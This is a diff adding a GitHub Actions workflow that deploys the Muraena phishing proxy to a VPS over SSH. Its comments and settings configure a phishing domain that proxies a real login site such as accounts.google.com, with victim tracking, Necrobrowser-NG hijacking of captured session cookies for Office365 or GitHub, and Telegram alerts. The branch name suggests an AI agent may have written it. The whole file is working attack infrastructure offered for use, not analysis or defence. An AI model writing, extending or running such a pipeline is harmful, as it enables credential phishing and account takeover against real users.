@@ -1,0 +1,168 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# Muraena — Deploy to VPS
+#
+# Required GitHub Secrets (Settings → Secrets → Actions):
+#
+#   VPS_HOST                  IP address or hostname of your VPS
+#   VPS_USER                  SSH user (e.g. root, ubuntu, deploy)
+#   VPS_SSH_KEY               Private SSH key (entire contents, including header/footer)
+#   VPS_PORT                  SSH port (optional — defaults to 22)
+#
+#   MURAENA_PHISHING_DOMAIN   Your phishing domain (e.g. evil.example.com)
+#   MURAENA_TARGET_DOMAIN     Domain to proxy (e.g. accounts.google.com)
+#   MURAENA_TLS_MODE          1=Let's Encrypt  2=self-signed  3=HTTP only (default: 3)
+#   MURAENA_TRACKING          true/false — enable victim tracking (default: true)
+#   MURAENA_SESSION_MODE      1=store only  2=Necrobrowser-NG Docker  3=Necrobrowser-NG external
+#
+# Optional Secrets (only needed for specific session modes or features):
+#   MURAENA_NECRO_ENDPOINT    Necrobrowser-NG URL (required when SESSION_MODE=3)
+#   MURAENA_NECRO_COOKIES     Trigger cookie names, comma-separated (default: sessionToken)
+#   MURAENA_NECRO_TASK_TYPE   Task type: office365, github, generic … (default: generic)
+#   MURAENA_TELEGRAM_TOKEN    Telegram bot token
+#   MURAENA_TELEGRAM_CHAT_ID  Telegram chat/group ID
+# ─────────────────────────────────────────────────────────────────────────────
+
+name: Deploy to VPS
+
+on:
+  push:
+    branches:
+      - claude/updated-v1.25
+      - main
+      - master
+  workflow_dispatch:
+    inputs:
+      tls_mode:
+        description: "TLS mode: 1=Let's Encrypt  2=self-signed  3=HTTP only"
+        required: false
+        default: ""
+      session_mode:
+        description: "Session mode: 1=store only  2=Necrobrowser Docker  3=Necrobrowser external"
+        required: false
+        default: ""
+
+jobs:
+  deploy:
+    name: Deploy & configure Muraena on VPS
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    steps:
+      # ── 1. Set up SSH ───────────────────────────────────────────────────────
+      - name: Configure SSH key
+        run: |
+          mkdir -p ~/.ssh
+          printf '%s\n' "${{ secrets.VPS_SSH_KEY }}" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          ssh-keyscan -p "${{ secrets.VPS_PORT || 22 }}" "${{ secrets.VPS_HOST }}" \
+            >> ~/.ssh/known_hosts 2>/dev/null
+
+      # ── 2. Deploy ───────────────────────────────────────────────────────────
+      - name: Deploy to VPS
+        env:
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_USER: ${{ secrets.VPS_USER }}
+          VPS_PORT: ${{ secrets.VPS_PORT || 22 }}
+          # Muraena config — passed to setup.sh --ci on the VPS
+          M_PHISHING:    ${{ secrets.MURAENA_PHISHING_DOMAIN }}
+          M_TARGET:      ${{ secrets.MURAENA_TARGET_DOMAIN }}
+          M_TLS:         ${{ inputs.tls_mode       || secrets.MURAENA_TLS_MODE     || '3' }}
+          M_TRACKING:    ${{ secrets.MURAENA_TRACKING    || 'true' }}
+          M_SESSION:     ${{ inputs.session_mode   || secrets.MURAENA_SESSION_MODE || '1' }}
+          M_NECRO_EP:    ${{ secrets.MURAENA_NECRO_ENDPOINT  || '' }}
+          M_NECRO_CK:    ${{ secrets.MURAENA_NECRO_COOKIES   || 'sessionToken' }}
+          M_NECRO_TASK:  ${{ secrets.MURAENA_NECRO_TASK_TYPE || 'generic' }}
+          M_TG_TOKEN:    ${{ secrets.MURAENA_TELEGRAM_TOKEN   || '' }}
+          M_TG_CHAT:     ${{ secrets.MURAENA_TELEGRAM_CHAT_ID || '' }}
+        run: |
+          ssh -i ~/.ssh/deploy_key \
+              -p "$VPS_PORT" \
+              -o StrictHostKeyChecking=yes \
+              -o ConnectTimeout=30 \
+              "$VPS_USER@$VPS_HOST" \
+              MURAENA_PHISHING_DOMAIN="$M_PHISHING" \
+              MURAENA_TARGET_DOMAIN="$M_TARGET" \
+              MURAENA_TLS_MODE="$M_TLS" \
+              MURAENA_TRACKING="$M_TRACKING" \
+              MURAENA_SESSION_MODE="$M_SESSION" \
+              MURAENA_NECRO_ENDPOINT="$M_NECRO_EP" \
+              MURAENA_NECRO_COOKIES="$M_NECRO_CK" \
+              MURAENA_NECRO_TASK_TYPE="$M_NECRO_TASK" \
+              MURAENA_TELEGRAM_TOKEN="$M_TG_TOKEN" \
+              MURAENA_TELEGRAM_CHAT_ID="$M_TG_CHAT" \
+              bash -s << 'REMOTE'
+
+          set -euo pipefail
+
+          REPO_DIR="/opt/muraena"
+          REPO_URL="https://github.com/5l33m/muraena.git"
+          BRANCH="claude/updated-v1.25"
+
+          echo "==> [1/5] Installing prerequisites..."
+          if command -v apt-get &>/dev/null; then
+              export DEBIAN_FRONTEND=noninteractive
+              apt-get update -qq
+              apt-get install -y -qq git openssl curl ca-certificates
+          elif command -v yum &>/dev/null; then
+              yum install -y -q git openssl curl ca-certificates
+          elif command -v apk &>/dev/null; then
+              apk add --quiet git openssl curl ca-certificates
+          fi
+
+          echo "==> [2/5] Installing Docker (if missing)..."
+          if ! command -v docker &>/dev/null; then
+              curl -fsSL https://get.docker.com | sh
+              systemctl enable docker
+              systemctl start docker
+          fi
+          if ! docker compose version &>/dev/null; then
+              # Install compose plugin if only docker engine is present
+              apt-get install -y -qq docker-compose-plugin 2>/dev/null || \
+              yum install -y -q docker-compose-plugin 2>/dev/null || true
+          fi
+
+          echo "==> [3/5] Fetching repository..."
+          if [[ -d "$REPO_DIR/.git" ]]; then
+              git -C "$REPO_DIR" fetch --quiet origin "$BRANCH"
+              git -C "$REPO_DIR" reset --hard "origin/$BRANCH"
+              git -C "$REPO_DIR" clean -fd
+          else
+              git clone --quiet --branch "$BRANCH" --depth 1 "$REPO_URL" "$REPO_DIR"
+          fi
+          cd "$REPO_DIR"
+
+          echo "==> [4/5] Running setup..."
+          bash setup.sh --ci
+
+          echo "==> [5/5] Done."
+          echo ""
+          docker compose ps
+          REMOTE
+
+      # ── 3. Health check ─────────────────────────────────────────────────────
+      - name: Health check
+        env:
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_USER: ${{ secrets.VPS_USER }}
+          VPS_PORT: ${{ secrets.VPS_PORT || 22 }}
+        run: |
+          ssh -i ~/.ssh/deploy_key \
+              -p "$VPS_PORT" \
+              -o StrictHostKeyChecking=yes \
+              "$VPS_USER@$VPS_HOST" \
+              bash -s << 'REMOTE'
+          cd /opt/muraena
+          # Muraena and Redis must both be running
+          docker compose ps --format json \
+            | grep -E '"State":"running"' \
+            | grep -q muraena \
+            && echo "muraena: running" \
+            || { echo "muraena: NOT running"; docker compose logs --tail 30 muraena; exit 1; }
+          docker compose ps --format json \
+            | grep -E '"State":"running"' \
+            | grep -q redis \
+            && echo "redis  : running" \
+            || { echo "redis: NOT running"; docker compose logs --tail 20 redis; exit 1; }
+          echo ""
+          echo "Deployment successful."
+          REMOTE
